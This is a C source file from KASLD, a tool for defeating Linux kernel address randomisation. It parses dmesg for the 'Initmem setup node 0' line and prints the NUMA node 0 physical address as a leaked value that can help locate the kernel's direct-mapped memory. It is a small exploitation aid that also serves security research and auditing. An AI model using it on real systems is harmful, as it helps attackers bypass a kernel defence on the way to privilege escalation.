// This file is part of KASLD - https://github.com/bcoles/kasld
//
// free_area_init_node() prints the start / end physical address for a NUMA
// node to dmesg. free_area_init() calls free_area_init_node() for each node
// starting from the first node (node zero) with the lowest address.
//
// On systems with a known phys->virt offset mapping, this may be used to
// identify the kernel virtual address region used for direct mapping.
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities.
//
// References:
// https://elixir.bootlin.com/linux/v6.1.1/source/mm/page_alloc.c#L7927
// https://www.kernel.org/doc/html/v5.3/vm/memory-model.html
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "kasld.h"
#include "include/syslog.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

unsigned long get_phys_addr_dmesg_free_area_init_node() {
  char *syslog;
  char *endptr;
  char *substr;
  char *line_buf;
  char *addr_buf;
  const char *needle = "Initmem setup node 0 ";
  int size;
  unsigned long addr = 0;

  printf("[.] searching for free_area_init_node() info ...\n");

  if (mmap_syslog(&syslog, &size))
    return 0;

  substr = strstr(syslog, needle);
  if (substr == NULL)
    return 0;

  line_buf = strtok(substr, "\n");
  if (line_buf == NULL)
    return 0;

  /* Initmem setup node 0 [mem 0x0000000080200000-0x00000000ffffffff] */
  // printf("%s\n", line_buf);

  addr_buf = strstr(line_buf, " [mem ");
  if (addr_buf == NULL)
    return 0;

  addr = strtoul(&addr_buf[5], &endptr, 16);
  if (addr)
    return addr;

  return 0;
}

int main() {
  unsigned long addr = get_phys_addr_dmesg_free_area_init_node();
  if (!addr)
    return 1;

  printf("leaked NUMA NODE #0 physical address: %#018lx\n", addr);

  return 0;
}
